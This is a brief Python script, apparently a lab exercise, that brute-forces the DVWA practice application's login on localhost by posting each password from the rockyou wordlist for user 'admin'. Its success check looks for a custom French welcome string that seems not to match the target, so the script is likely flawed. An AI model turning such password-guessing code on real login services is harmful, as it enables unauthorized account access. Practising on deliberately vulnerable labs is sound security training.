#!/usr/bin/python 



import requests

url = "http://127.0.0.1/dvwa/vulnerabilities/brute/"
arq = open("/usr/share/wordlist/rockyou.txt", 'r').readlines() 


for line in arq:
	password = line.strip()
	http = requests.post(url,data={'username':'admin', 'password':password, "Login":"Login"})
	content = http.content
	string_search = str.encode('Bienvenue dans le Matéo Brute Force Tool !')

	if string_search in content:
		print("Mot de passe trouver :" +password+ "!")
		break
	else:
		print("Mot de passe introuvé" +password+ ".")